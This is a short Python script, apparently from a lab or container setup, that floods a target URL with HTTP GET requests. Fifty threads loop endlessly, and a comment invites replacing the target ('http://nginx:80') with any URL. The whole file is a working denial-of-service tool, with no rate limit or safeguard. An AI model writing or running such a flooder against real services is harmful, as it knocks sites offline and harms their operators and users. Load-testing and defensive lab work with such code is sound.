import requests
import threading

# Target URL to flood
target_url = 'http://nginx:80'  # Replace this with the target URL


# Function to send HTTP requests
def send_http_request():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Sent request to {target_url}, Response: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")


# Simulate multiple concurrent requests
num_threads = 50  # Number of concurrent threads
threads = []


for i in range(num_threads):
    thread = threading.Thread(target=send_http_request)
    thread.daemon = True
    threads.append(thread)

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()
